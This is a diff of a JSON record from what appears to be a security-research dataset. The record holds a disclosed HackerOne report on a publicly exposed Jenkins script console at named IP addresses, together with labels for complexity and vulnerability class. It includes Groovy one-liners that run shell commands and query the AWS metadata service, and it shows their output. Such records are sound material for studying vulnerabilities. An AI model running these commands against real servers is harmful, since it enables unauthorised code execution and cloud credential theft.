@@ -1,42 +1,46 @@
 {
-    "reported_to": "Ubiquiti Inc.",
-    "reported_by": "smiegles ",
-    "title": "Public Jenkins instance with /script enabled",
-    "content": "\nHi,\nFirst of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.\nCode 131 Bytes\n1DNS Name: *.uum.com\n2DNS Name: *.ubnt.com\n3DNS Name: *.svc.ubnt.com\n4DNS Name: *.api.uum.com\n5DNS Name: *.svc.uum.com\n6DNS Name: uum.com\nSo, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.\nYou can execute code on it by going to: https://54.186.253.37/script and insert the following code:\nCode 21 Bytes\n1\"ls /\".execute().text\nresult\nCode 562 Bytes\n1Result: bin\n2boot\n3dev\n4docker-java-home\n5etc\n6home\n7lib\n8lib64\n9media\n10mnt\n11opt\n12proc\n13root\n14run\n15sbin\n16srv\n17sys\n18tmp\n19usr\n20var\n21```\n22\n23It also allows reaching the AWS metadata server:\n24\n25```\n26\"curl http://169.254.169.254/latest/meta-data/\".execute().text\n27```\n28\n29__Result__\n30\n31```\n32ami-id\n33ami-launch-index\n34ami-manifest-path\n35block-device-mapping/\n36hostname\n37iam/\n38instance-action\n39instance-id\n40instance-type\n41local-hostname\n42local-ipv4\n43mac\n44metrics/\n45network/\n46placement/\n47profile\n48public-hostname\n49public-ipv4\n50public-keys/\n51reservation-id\n52security-groups\n53services/\n54```\n55\n56## Impact\n57\n58RCE\n59\n60{F340446}\n61{F340447}\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "Ubiquiti Inc.",
+  "reported_by": "smiegles ",
+  "title": "Public Jenkins instance with /script enabled",
+  "content": "\nHi,\nFirst of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.\nCode 131 Bytes\n1DNS Name: *.uum.com\n2DNS Name: *.ubnt.com\n3DNS Name: *.svc.ubnt.com\n4DNS Name: *.api.uum.com\n5DNS Name: *.svc.uum.com\n6DNS Name: uum.com\nSo, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.\nYou can execute code on it by going to: https://54.186.253.37/script and insert the following code:\nCode 21 Bytes\n1\"ls /\".execute().text\nresult\nCode 562 Bytes\n1Result: bin\n2boot\n3dev\n4docker-java-home\n5etc\n6home\n7lib\n8lib64\n9media\n10mnt\n11opt\n12proc\n13root\n14run\n15sbin\n16srv\n17sys\n18tmp\n19usr\n20var\n21```\n22\n23It also allows reaching the AWS metadata server:\n24\n25```\n26\"curl http://169.254.169.254/latest/meta-data/\".execute().text\n27```\n28\n29__Result__\n30\n31```\n32ami-id\n33ami-launch-index\n34ami-manifest-path\n35block-device-mapping/\n36hostname\n37iam/\n38instance-action\n39instance-id\n40instance-type\n41local-hostname\n42local-ipv4\n43mac\n44metrics/\n45network/\n46placement/\n47profile\n48public-hostname\n49public-ipv4\n50public-keys/\n51reservation-id\n52security-groups\n53services/\n54```\n55\n56## Impact\n57\n58RCE\n59\n60{F340446}\n61{F340447}\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1536610860,
+  "report_url": "https://hackerone.com/reports/403402",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Access the Jenkins instance at https://54.186.253.37/script"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Code Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1536610860,
-    "report_url": "https://hackerone.com/reports/403402",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Access the Jenkins instance at https://54.186.253.37/script"
-        ],
-        [
-            2,
-            "Enter the Groovy script 'ls /'.execute().text to list the root directory contents"
-        ]
-    ],
-    "vuln_description": "The Jenkins instance has the script console enabled and accessible without authentication, allowing remote code execution (RCE) by executing arbitrary Groovy scripts. Additionally, the instance allows access to the AWS metadata server, which could lead to further exploitation.",
-    "reason": "The vulnerability is straightforward to discover as it involves accessing a publicly exposed Jenkins script console and executing simple commands. No complex interactions or state manipulations are required.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The report involves a public Jenkins instance with script console enabled, which is an authentication/authorization bypass vulnerability. The methodology described focuses on detecting IDOR and AuthN/AuthZ bypass vulnerabilities within the same application by testing different user sessions and resource IDs. However, the Jenkins vulnerability is a misconfiguration that allows unauthenticated users to execute arbitrary code, which is not covered by the described methodology as it doesn't involve user sessions or resource IDs within the same application context.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Enter the Groovy script 'ls /'.execute().text to list the root directory contents"
+    ]
+  ],
+  "vuln_description": "The Jenkins instance has the script console enabled and accessible without authentication, allowing remote code execution (RCE) by executing arbitrary Groovy scripts. Additionally, the instance allows access to the AWS metadata server, which could lead to further exploitation.",
+  "reason": "The vulnerability is straightforward to discover as it involves accessing a publicly exposed Jenkins script console and executing simple commands. No complex interactions or state manipulations are required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an exposed Jenkins instance with script console access, which is a server misconfiguration rather than an authentication or authorization flaw within an application's user session/resource access control. The methodology described focuses on testing authorization boundaries between user sessions and resources within the same application, not on detecting exposed administrative interfaces or misconfigured services.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The Jenkins script console (`/script`) is a dedicated endpoint for executing arbitrary code, not a parameter injected into a normal user-facing input. The methodology focuses on discovering injectable parameters during regular navigation and testing them with simple payloads. However, the script console is explicitly designed for code execution and would not be identified as a 'parameter' during normal request/response analysis unless the tester directly navigates to `/script` (which is not part of regular user behavior). The payloads used (e.g., `\"ls /\".execute().text`) are simple, but the attack surface (direct script console access) is not a parameter extracted from regular navigation flows, making it outside the scope of the methodology.",
+    "is_simple_injection": false
+  }
 }
